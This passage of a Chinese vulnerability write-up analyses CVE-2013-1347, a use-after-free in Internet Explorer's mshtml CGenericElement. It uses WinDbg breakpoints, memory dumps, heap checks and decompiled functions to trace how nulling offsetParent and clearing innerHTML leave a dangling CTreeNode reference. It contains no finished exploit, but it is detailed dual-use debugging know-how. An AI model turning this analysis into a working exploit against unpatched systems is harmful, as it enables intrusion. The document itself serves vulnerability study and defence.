69e79d65 mshtml!CDisplayRequestGetOffsetParent::GetOffsetTopLeft = <no type information>
69e812b3 mshtml!CLayoutBlock::IsOffsetParent = <no type information>
69e81915 mshtml!CDisplayRequestGetOffsetParent::SetOffsetParentDisplayBox = <no type information>
69e811e3 mshtml!CDisplayRequestGetOffsetParent::OffsetParent = <no type information>
69f5cd62 mshtml!CElement::GetOffsetParentHelper = <no type information>
69e819b1 mshtml!CTextDisplayBox::IsOffsetParent = <no type information>
6a01c914 mshtml!s_propdescCElementoffsetParent = <no type information>
69e8192d mshtml!CDisplayRequestGetOffsetParent::SetSourceDisplayBox = <no type information>
69f5d418 mshtml!CElement::get_offsetParent = <no type information>
69e81798 mshtml!CDisplayBox::TransformRectToOffsetParent = <no type information>
```

从函数名来看相关函数可能为CElement::GetOffsetParentHelper和CElement::get_offsetParent，从IDA中查到CElement::get_offsetParent会调用CElement::GetOffsetParentHelper函数。

在CElement::GetOffsetParentHelper下断点，查看各个元素和节点的分配情况，然后跳出函数，再查看元素和节点的内存分配，比较其不同。

重新加载后，添加断点：

```cpp,c
bu mshtml!CMarkup::InsertElementInternal+1de ".echo '===CTreeNode===';dd eax l1;dps poi(eax) l1;g"
bu 6417d6de+37 "ln eax;g"  // 此处地址不固定
bu mshtml!CElement::CElement+0x1e ".echo '===CElement===';dd edi l(28/4);g"
bu CElement::GetOffsetParentHelper
```

运行结果：

```cpp,c
'===CElement==='
06b65fd8  6a1f5570 00000001 00000008 00000000
06b65fe8  00000000 00000000 00000000 00000000
06b65ff8  00000000 00000000
'===CTreeNode==='
068bffb0  06b65fd8
06b65fd8  6a2e8fd8 mshtml!CSpanElement::`vftable'
(6a2e8f8c)   mshtml!CSpanElement::CreateElement   |  (6a2e8fd8)   mshtml!CSpanElement::`vftable'
Exact matches:
    mshtml!CSpanElement::CreateElement = <no type information>
'===CElement==='
081e9fd8  6a1f5570 00000001 00000008 00000000
081e9fe8  00000000 00000000 00000000 00000000
081e9ff8  00000000 00000000
'===CTreeNode==='
075bafb0  081e9fd8
081e9fd8  6a2e8fd8 mshtml!CSpanElement::`vftable'
(6a2e8f8c)   mshtml!CSpanElement::CreateElement   |  (6a2e8fd8)   mshtml!CSpanElement::`vftable'
Exact matches:
    mshtml!CSpanElement::CreateElement = <no type information>
'===CElement==='
08294fd8  6a1f5570 00000001 00000008 00000000
08294fe8  00000000 00000000 00000000 00000000
08294ff8  00000000 00000000
'===CTreeNode==='
081e7fb0  08294fd8
08294fd8  6a2e8fd8 mshtml!CSpanElement::`vftable'
(6a2fc4de)   mshtml!CGenericElement::CreateElement   |  (6a2fc523)   mshtml!CGenericElement::CGenericElement
Exact matches:
    mshtml!CGenericElement::CreateElement = <no type information>
'===CElement==='
05884fc8  6a1f5570 00000001 00000008 00000000
05884fd8  00000000 00000000 00000000 00000000
05884fe8  00000000 00000000
'===CTreeNode==='
082eafb0  05884fc8
05884fc8  6a2fc590 mshtml!CGenericElement::`vftable'
(6a2da55d)   mshtml!CTable::CreateElement   |  (6a2da59e)   mshtml!CTable::CTable
Exact matches:
    mshtml!CTable::CreateElement = <no type information>
'===CElement==='
08254fb8  6a1f5570 00000001 00000008 00000000
08254fc8  00000000 00000000 00000000 00000000
08254fd8  00000000 00000000
'===CTreeNode==='
06b34fb0  08254fb8
08254fb8  6a1f6488 mshtml!CTable::`vftable'
Breakpoint 3 hit
eax=06b65fd8 ebx=00000000 ecx=6a2fd418 edx=00000000 esi=06b65fd8 edi=0454d0d0
eip=6a2fcd62 esp=0454d038 ebp=0454d048 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
mshtml!CElement::GetOffsetParentHelper:
6a2fcd62 8bff            mov     edi,edi
```

运行后进程断在了CElement::GetOffsetParentHelper，此时调试各个元素和节点的分配情况，并观察其前后变化，调试命令使用：

```cpp,c
dd element_addr la
dd ctreenode_addr l13
```

f0元素及其CTreeNode前后变化：

![4.png](https://i.loli.net/2021/09/06/W13fG5UM7YvtSAD.png)

![5.png](https://i.loli.net/2021/09/06/BkOTeJwLh35xbdU.png)

![6.png](https://i.loli.net/2021/09/06/r5mbQp8jBPNZFfV.png)

![7.png](https://i.loli.net/2021/09/06/ZRX1j95dIyCMUHV.png)

通过对比、调试以及查看IE源码能够看出：

1. CTreeNode + 0x0 处 DWORD：对应元素CElement的地址
2. CTreeNode + 0x4 处 DWORD：父元素的CTreeNode地址
3. CTreeNode + 0x8 处  WORD：不同元素不同的标记值
4. CTreeNode + 0xC 处 DWORD：SHORT _iCF和HSORT _iFF的值，分别表示Char Format和Fancy Format
4. CTreeNode + 0x44处 DWORD：CTextBlock结构指针
5. CElement  + 0x14处 DWORD：元素对应CTreeNode指针
6. CElement  + 0x18处  WORD：不同元素不同的标记值

另外，虽然此处对f0元素的offsetParent置空，但是f1和f2的CTreeNode+0xC处的值也被写为2

下面看下一处js代码：

```js
f2.innerHTML="";
```

此处代码为将f2的内部HTML代码清空，而其占用的内存会在最后使用CollectGarbage()函数时被释放。

同样先在windbg中查找相关可能的函数：

```cpp,c
0:005> x mshtml!*innerHTML*
6a3bdc14 mshtml!s_propdescCElementinnerHTML = <no type information>
6a30faba mshtml!CElement::get_innerHTML = <no type information>
6a30a7c3 mshtml!CElement::put_innerHTML = <no type information>
```

此时这样下断点：

```cpp,c
bp mshtml!CElement::put_innerHTML
```
到达断点后跳出函数，查看CGenericElement对应的CElement以及CTreeNode分配内存情况,然后继续运行，再一次断在了CElement::put_innerHTML，这次正是f1.innerHTML=""; 这句执行的结果，此时记录对应的CElement以及CTreeNode内存情况，然后跳出函数，再次记录对应的CElement以及CTreeNode内存情况，继续运行至程序报错，再次记录对应的CElement以及CTreeNode内存情况。整理下来如图所示：

![8.png](https://i.loli.net/2021/09/06/ipx3I6bouC2B5Lm.png)

从图中可以看出：

1. CTreeNode的+0x8和0xC处的内容在offserParent后发生了改变，但是在执行innerHTML后又变量回来。
2. CTreeNode+0x44处的数据发生了变化，通过调试这部分其实是一个CTextBlock指针，也就是在设置完offsetParent后进行了一次渲染。
3. 在执行innerHTML后，CTreeNode的保存的父元素TreeNode的地址清零了，但是保存对应元素的地址还在。
4. CElement中对应元素TreeNode地址也清零了
5. 虽然CGenericElement元素的内存已经释放，但是CTreeNode中的指针仍然指向已经释放的内存。

继续运行至报错：

```cpp,c
0:005> g
(c24.adc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=6a729100 ebx=082eafb0 ecx=05884fc8 edx=00000000 esi=0454d150 edi=00000000
eip=6a3ab68d esp=0454d124 ebp=0454d13c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!CElement::Doc:
6a3ab68d 8b01            mov     eax,dword ptr [ecx]  ds:0023:05884fc8=????????
```

能够看到报错的地址05884fc8就是CGenericElement元素的首地址，查看CGenericElement元素和对应的CTreeNode的堆情况：

```cpp,c
0:005> !heap -p -a 05884fc8 
    address 05884fc8 found in
    _DPH_HEAP_ROOT @ 1181000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    6642a90:          5884000             2000
0:005> !heap -p -a 082eafb0
    address 082eafb0 found in
    _DPH_HEAP_ROOT @ 1181000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                                 6bc4034:          82eafb0               4c -          82ea000             2000
```
CGenericElement元素处于已释放状态，对应的CTreeNode堆仍然处于占用状态。

查看函数调用情况：

```cpp,c
0:005> kb
ChildEBP RetAddr  Args to Child              
0454d120 6a3e9b02 0454d46c 082eafb0 00000000 mshtml!CElement::Doc
0454d13c 6a3e9a0e 082eafb0 0454d46c 082eafb0 mshtml!CTreeNode::ComputeFormats+0xba
0454d3e8 6a3f872a 082eafb0 082eafb0 0454d408 mshtml!CTreeNode::ComputeFormatsHelper+0x44
0454d3f8 6a3f86ea 082eafb0 082eafb0 0454d418 mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11
0454d408 6a3f86d1 082eafb0 082eafb0 0454d424 mshtml!CTreeNode::GetFancyFormatHelper+0xf
0454d418 6a2829cb 082eafb0 0454d434 6a282ae6 mshtml!CTreeNode::GetFancyFormat+0x35
0454d424 6a282ae6 00000000 082eafb0 0454d444 mshtml!ISpanQualifier::GetFancyFormat+0x5a
0454d434 6a282ac2 00000000 05c74fa0 0454d47c mshtml!SLayoutRun::HasInlineMbp+0x10
0454d444 6a2a0f3d 00000000 00000000 05c74fa0 mshtml!SRunPointer::HasInlineMbp+0x56
0454d47c 6a254b64 0454d49b 00000000 00000000 mshtml!CLayoutBlock::GetIsEmptyContent+0xf2
0454d4b4 6a49e223 0454d51f 0454d533 08d2dff0 mshtml!CLayoutBlock::GetIsEmptyContent+0x3f
0454d500 6a2904ee 08390fc8 08d2df30 083dcfd8 mshtml!CBlockContainerBlock::BuildBlockContainer+0x250
0454d538 6a291290 08d2df30 00000000 069e6fc8 mshtml!CLayoutBlock::BuildBlock+0x1c1
0454d5fc 6a292176 01d2df30 06700fa8 0454d623 mshtml!CCssDocumentLayout::GetPage+0x22a
0454d76c 6a3f566c 0454d930 0454d8c8 00000000 mshtml!CCssPageLayout::CalcSizeVirtual+0x254
0454d8a4 6a405c6b 06700fa8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8
......

```
看到082eafb0这个地址被作为参数层层传递，最早引用这个地址的函数为ISpanQualifier::GetFancyFormat函数，查看其之前的函数SRunPointer::HasInlineMbp：

```cpp,c
.text:74CABE9B                 mov     edi, edi
.text:74CABE9D                 push    ebp
.text:74CABE9E                 mov     ebp, esp
.text:74CABEA0                 push    esi             ; bool
.text:74CABEA1                 mov     eax, edi
.text:74CABEA3                 call    ?SpanQualifier@SRunPointer@@QBEPAVISpanQualifier@@XZ ; SRunPointer::SpanQualifier(void)
.text:74CABEA8                 mov     esi, eax
.text:74CABEAA                 call    ?IsPseudoElementQualifier@ISpanQualifier@@QBE_NXZ ; ISpanQualifier::IsPseudoElementQualifier(void)
.text:74CABEAF                 test    al, al
.text:74CABEB1                 jnz     loc_74ECF8DF
```

该函数会调用SRunPointer::SpanQualifier，查看该函数的反汇编：

```cpp,c
.text:74CABED9                 mov     eax, [eax+4]
.text:74CABEDC                 cmp     eax, 1
.text:74CABEDF                 jz      short loc_74CABEF8
.text:74CABEE1                 cmp     eax, 3
.text:74CABEE4                 jz      short loc_74CABEF8
.text:74CABEE6                 mov     ecx, [eax]
.text:74CABEE8                 and     cl, 7
.text:74CABEEB                 cmp     cl, 1
.text:74CABEEE                 jz      loc_74CA7E7A
.text:74CABEF4                 mov     eax, [eax+0Ch]
.text:74CABEF7                 retn
```

可以看到函数修改了eax的值，设下断点查看eax+4处的结构：

```cpp,c
bu SRunPointer::SpanQualifier ".echo '======eax+4======';dd eax+4;g"
```
重新运行后期间会多次命中断点，这里取崩溃前的最后一个断点：

```cpp,c
(6994c4de)   mshtml!CGenericElement::CreateElement   |  (6994c523)   mshtml!CGenericElement::CGenericElement
Exact matches:
    mshtml!CGenericElement::CreateElement = <no type information>
'===CElement==='
00322018  69845570 00000001 00000008 00000000
00322028  00000000 00000000 00000000 00000000
00322038  00000000 00000000
'===CTreeNode==='
00317b88  00322018
00322018  6994c590 mshtml!CGenericElement::`vftable'

......

'======eax+4======'
0242d188  02d07998 00000000 02cd72c0 0242d1cc
0242d198  698a4b64 0242d1b3 00000000 00000000
0242d1a8  0242d2d8 69915be8 0000d1c4 00000000
0242d1b8  00000036 0242d233 69a306bf 0242d218
0242d1c8  698dcc7b 0242d218 69aee223 0242d237
0242d1d8  0242d24b 02d043e8 0242d308 00000002
0242d1e8  00337c90 00000000 0242d24b 02cd7200
0242d1f8  0242d301 00338688 00000000 00337c90

0:005> dd 02d07998
02d07998  00000805 00000002 00337e30 00337e20
02d079a8  00000806 00000003 00337e48 00337e20
02d079b8  00000806 00000004 00338688 00338660

0:005> ln poi(poi(00338660))
(69938fd8)   mshtml!CSpanElement::`vftable'   |  (698473d8)   mshtml!CBlockElement::`vftable'
Exact matches:
    mshtml!CSpanElement::`vftable' = <no type information>

(5cc.f18): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=69916330 ebx=00317b88 ecx=00322018 edx=1d526585 esi=0231cd88 edi=00000000
eip=1d526585 esp=0231cd58 ebp=0231cd74 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
1d526585 ??              ???

0:005> dd 00317b88
00317b88  00322018 00000000 ffff0075 ffffffff
00317b98  00000071 00000000 00000000 00000000
00317ba8  00000000 00317bb0 00000152 00000001
00317bb8  00000000 00000000 00317b98 00000000
00317bc8  00000010 00000000 00000000 00000000
00317bd8  00000000 00000000 00000000 00000000
00317be8  00000000 00000000 14b9e04f 080039ac
00317bf8  0069004d 00720063 0073006f 0066006f
```

能够看到eax+4的地址处是一个数组列表，每个数组偏移+4的地址是数组的ID值，偏移+8是CTreePos地址，用于标记元素在DOM树的位置，偏移+0xC处是元素的CTreeNode地址,表中每一项大小16字节。这个数组暂且将这个数组叫做element_arry。

再看SRunPointer::SpanQualifier的汇编，最后函数还会将eax+0xC的地址赋值给eax，查看数组的+0xc处的值为00317b88，恰好是漏洞发生时的ebx的值，ebx指向的就是datalist元素的CTreeNode对象。

那么这个数组到底是干嘛用的呢，向前查看数组0x10字节：

```cpp,c
(69938f8c)   mshtml!CSpanElement::CreateElement   |  (69938fd8)   mshtml!CSpanElement::`vftable'
Exact matches:
    mshtml!CSpanElement::CreateElement = <no type information>
'===CElement==='
003bdca8  69845570 00000001 00000008 00000000
003bdcb8  00000000 00000000 00000000 00000000
003bdcc8  00000000 00000000
'===CTreeNode==='
03300d40  003bdca8
003bdca8  69938fd8 mshtml!CSpanElement::`vftable'

......

0:005> dd 003deec0-0x10
003deeb0  00000805 00000001 03300d50 03300d40
003deec0  00000805 00000002 00317b98 00317b88
003deed0  00000806 00000003 00317bb0 00317b88
003deee0  00000806 00000004 03300d68 03300d40
003deef0  5ad51e66 80000052 69a00092 6984a594
003def00  6984a594 00000000 00000000 00000000
003def10  6984a594 00000000 00000000 00000000
003def20  00000000 00000000 00354b40 000008d6
0:005> ln poi(03300d40)
0:005> dd 03300d40
03300d40  003bdca8 03300978 0001025b 00000002
03300d50  00000071 00000001 03300d10 03300b00
03300d60  03300d10 03300d68 00000052 00000000
03300d70  00000000 03300738 03300d50 033009a0
03300d80  00000040 00333850 00000000 00000004
03300d90  30b9e06b 10013aac 3f800000 00000000
03300da0  00000000 00000000 00000000 00000000
03300db0  00000000 00000000 00000000 00000000
0:005> ln poi(003bdca8)
(69938fd8)   mshtml!CSpanElement::`vftable'   |  (698473d8)   mshtml!CBlockElement::`vftable'
Exact matches:
    mshtml!CSpanElement::`vftable' = <no type information>
```
我们发现这里存放了03300d40这个地址，而这个地址就是span元素的地址，原来这个结构用于存储span元素和datalist的嵌套关系的。

在IDA中查看ISpanQualifier::GetFancyFormat函数：

```cpp,c
if ( ISpanQualifier::IsTreeNodeQualifier(this) )
	return CTreeNode::GetFancyFormat(v3); // v3是CTreeNode指针
```
继续跟进CTreeNode::GetFancyFormat查看：

```cpp,c
const struct CFancyFormat *__thiscall CTreeNode::GetFancyFormat(CTreeNode *this)
{
  __int16 v1; // ax
  const struct CFancyFormat *result; // eax

  v1 = *((_WORD *)this + 7); // 这里实际是CTreeNode+0xE处，也就是Fancy Format
  if ( v1 < 0 )  // 当Fancy Format的值小于0时才执行
    result = CTreeNode::GetFancyFormatHelper(this);
  else
    result = *(const struct CFancyFormat **)(12 * v1 + *(_DWORD *)(*((_DWORD *)TlsGetValue(g_dwTls) + 25) + 48));
  return result;
}
```

根据以上逻辑，只有在Fancy Format的值小于0时，函数才会深入，进一步调用CTreeNode::GetFancyFormatHelper，而在上面的CGenericElement元素的变化图中能够看出，在执行完offsetParent函数后不再小于0（0002），这样就不会调用CTreeNode::GetFancyFormatHelper区重新计算格式用于后续渲染，导致原本未被渲染的节点误以为渲染了。

我们将程序运行后断在f2.innerHTML函数，在Fancy Format处下访问断点（由于重新运行，地址已经发生变化）：

```cpp,c
0:005> ba r4 03274dc8+c
0:005> g
Breakpoint 5 hit
eax=00000005 ebx=00000000 ecx=00000036 edx=6943b69d esi=03274dc8 edi=003ce3e0
eip=6944e70b esp=024dcbd4 ebp=024dcc38 iopl=0         nv up ei ng nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
mshtml!CTreeNode::VoidCachedNodeInfo+0x16:
6944e70b 83cbff          or      ebx,0FFFFFFFFh
```

运行后程序断在了CTreeNode::VoidCachedNodeInfo函数，用IDA查看其源代码：

```cpp,c
void __usercall CTreeNode::VoidCachedNodeInfo(CTreeNode *this@<ecx>, signed __int16 *a2@<esi>)
{
  CDataCacheBase *v2; // ecx
  _DWORD *v3; // edi
  signed __int16 v4; // ax
  int v5; // ST00_4
  int v6; // eax
  int v7; // eax
  CDataCacheBase *v8; // ecx
  signed __int16 v9; // ax
  int v10; // ST00_4
  int v11; // eax

  v3 = TlsGetValue(g_dwTls);
  v4 = a2[6];  // a2是CTreeNode起始位置
  if ( v4 != -1 )  // 此处判断Char Format的值是否不是-1
  {
    v5 = v4;
    v6 = v3[23];
    CDataCacheBase::ReleaseData(v2, v5);
    a2[6] = -1;    // 将Char Format值设置为-1
    v7 = v3[24];
    CDataCacheBase::ReleaseData(v8, a2[5]);
    a2[5] = -1;    // 将Fancy Format值设置为-1
  }
  v9 = a2[7];
  if ( v9 != -1 )
  {
    v10 = v9;
    v11 = v3[25];
    CDataCacheBase::ReleaseData(v2, v10);
    a2[7] = -1;
  }
}
```
由于此时的Char Format的值为-1，因此此处将Char Format和Fancy Format值设置为-1。跳出这个函数，查看CTreeNode内存情况：

```cpp,c
0:005> dd 3274dc8 l13
03274dc8  003e33f0 032744d8 ffff025b ffffffff
03274dd8  00000d71 00000017 03274ce8 03233b40
03274de8  03274ce8 03274df0 00000062 00000000
03274df8  03274500 03274dd8 03274dd8 03274500
03274e08  00000028 032a6d08 00000000
```
此时Char Format和Fancy Format值被设置为了-1，查看对应的CGenericElement元素的内存：

```cpp,c
0:005> dd 003e33f0 la
003e33f0  69378fd8 00000004 00000008 00000000
003e3400  01f888e0 03274dc8 0000005b 80010200
003e3410  00000006 03233ab8
```
可以看到此时CTreeNode的地址（03274dc8）还在，经过f2.innerHTML函数之后，值就变为了0。在这里设置写入断点：

```cpp,c
ba w4 02cd6dc0+0x14
0:005> g
Breakpoint 5 hit
eax=02cd6dc0 ebx=00000000 ecx=00000e20 edx=00337e20 esi=00000000 edi=02cd6dc0
eip=699592be esp=0242c878 ebp=0242c9c0 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000286
mshtml!CSpliceTreeEngine::RemoveSplice+0x828:
699592be e85e691000      call    mshtml!CElement::DelMarkupPtr (69a5fc21)
```

通过CElement::DelMarkupPtr删除了CElement中对于CTreeNode的引用。

##### 3. 溯源漏洞本质

设置以下断点：

将网页源码中的f0.offsetParent=null; 这一行注释掉，再次运行没有发生报错。在Windbg中运行，这样下断点：

```cpp,c
0:016> bu mshtml!CMarkup::InsertElementInternal+0x1de ".echo '===CTreeNode===';dd eax l1;dps poi(eax) l1;g"
0:016> bu mshtml!CElement::CElement+0x1e ".echo '===CElement===';dd edi l(28/4);g"
0:016> bu SRunPointer::SpanQualifier ".echo '======eax+4======';dd eax+4;g"
0:016> bu jscript!JsAtan2 ".printf \"%mu\", poi(poi(poi(esp+14)+8)+8); .echo"
0:016> bu mshtml!CreateElement+37 "ln eax;g"
Matched: 6998141a mshtml!CreateElement = <no type information>
Matched: 699bd6de mshtml!CreateElement = <no type information>
Ambiguous symbol error at 'mshtml!CreateElement+37 "ln eax;g"'
0:016> bu 699bd6de+37 "ln eax;g"
```

再次运行后程序没有报错，运行一段时间后使用break暂停程序，找到datalist元素的地址：

```cpp,c
(695ac4de)   mshtml!CGenericElement::CreateElement   |  (695ac523)   mshtml!CGenericElement::CGenericElement
Exact matches:
    mshtml!CGenericElement::CreateElement = <no type information>
'===CElement==='
03461020  694a5570 00000001 00000008 00000000
03461030  00000000 00000000 00000000 00000000
03461040  00000000 00000000
'===CTreeNode==='
0052e7d8  03461020
03461020  695ac590 mshtml!CGenericElement::`vftable'
```
向下搜索CTreeNode地址0052e7d8，结果没有找到，说明后面的element_array没有建立datalist和span元素的嵌套关系，也就是说f2（span）元素已经不存在CTextBlock和element_array结构了，正是该代码导致的漏洞。

##### 4. 总结

1. 代码中堆f0.offsetParent进行置空，会将iCF格式置为1，使得它后续不做节点格式计算，相当于被标记位已被渲染的状态，由于设置的是f0的父节点body，会导致其相邻的f1和f2都受到影响，所有的CTreeNode的iCF值都会被置为1，使得原本未被渲染的他们误以为渲染了。

2. 在f0中添加hr子元素，会改变DOM树结构并进行重绘，此时需要遍历CTreeNode，就会引用到CGnericElement的CTreeNode。

3. 由于第1步中的原因，导致CGnericElement的CTreeNode未被删除，虽然此时的DOM树结构已经改变，但是用于构建页面布局的CTextBlock依然保存着对CGenericElement的引用，而此时CGenericElement早已因f2.iNnerHTML函数被清空释放掉，最终导致UAF漏洞的发生。

## 三、缓解措施

安装补丁

## 四、参考文献

《漏洞战争》

[博客园：CVE-2013-1347：从入门到放弃之调试分析令人崩溃的 Microsoft IE CGenericElement UAF 漏洞](https://www.cnblogs.com/csnd/p/11800512.html)

[看雪：超级长的IE调试总结：CVE-2013-1347 IE CGenericElement UAF漏洞分析](https://bbs.pediy.com/thread-269018.htm)
